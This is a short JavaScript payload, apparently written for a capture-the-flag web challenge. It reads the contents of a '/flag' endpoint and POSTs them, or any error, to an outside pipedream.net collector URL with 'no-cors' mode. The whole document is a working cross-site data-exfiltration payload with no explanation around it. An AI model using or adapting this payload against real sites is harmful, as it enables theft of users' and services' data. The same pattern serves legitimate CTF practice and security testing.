script:
fetch('/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('https://eokqbbiypxqueat.m.pipedream.net', {
      method: 'POST',
      mode: 'no-cors',
      body: 'SUCCESS: ' + flag
    });
  })
  .catch(e => {
    fetch('https://eokqbbiypxqueat.m.pipedream.net', {
      method: 'POST',
      mode: 'no-cors',
      body: 'ERROR: ' + e
    });
  });
